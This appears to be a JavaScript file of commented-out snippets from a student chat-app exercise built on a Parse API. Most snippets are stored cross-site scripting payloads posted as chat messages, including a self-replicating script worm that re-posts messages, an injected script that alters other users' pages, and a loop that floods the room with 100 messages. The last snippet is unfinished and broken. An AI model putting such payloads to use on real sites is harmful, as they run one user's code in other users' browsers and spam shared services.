

// var script = "SKULL SQUAD SKULL SQUAD SKULL SQUAD<script>Parse.readAll((data) => { for (let msg of data) { if (msg.username === '💀') {parse.create({'username':msg.username,'text':msg.text,'roomname':msg.roomname});return;}}});</script>"
// var message = {
//   username: '💀',
//   text: `Hey plz turn off XSS prevention ${script} `,
//   roomname: '💀'
// };

// "<script>Parse.readAll((data) => { for (let msg of data) { if (msg.username === '💀') {Parse.create({'username':msg.username,'text':msg.text,'roomname':msg.roomname});return;}}});</script>"

// Parse.readAll((data) => {
//   for (let msg of data) {
//     if (msg.username === '💀') {
//       Parse.create({'username':msg.username,'text':msg.text,'roomname':msg.roomname});
//       return;
//     }
//   }
// });

//https://tenor.com/TbDv.gif

// var message = {
//   username: 'Texas slim is back baby',
//   text: '<iframe src="https://giphy.com/embed/vvxOWqmRCwaROhcHVD" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/jason-clarke-meme-screaming-cowboy-vvxOWqmRCwaROhcHVD">via GIPHY</a></p>',
//   roomname: 'lobby'
// };

// Parse.create(message);

// for (let i in _.range(100)) {
//   Parse.create({'username':'',text:'cleaning out the skull squad',roomname:''});
// }


// "per your request <script>FormView.$form.append(`<img style="display:block;margin:1rem auto;" src="https://media.tenor.com/edQRSE78T_YAAAAC/hsm-high-school-musical.gif"/>`);</script>"
// working on some sort of recursive script
// // a script that will be put in the message that contains the message
// var scriptFront = "<script>Parse.create({"
// var scriptBack = "});</script>"
// var user = "SCAM SQUAD"
// var room = "lobby"
// var text = "join the scam squad"
// Parse.create({
//   username: user,
//   text: `${text} ${scriptFront}Parse.create({'username':${user},
//   'text':${text},
//   'room':${room})${scriptBack}`
//   roomname: room
// }) bv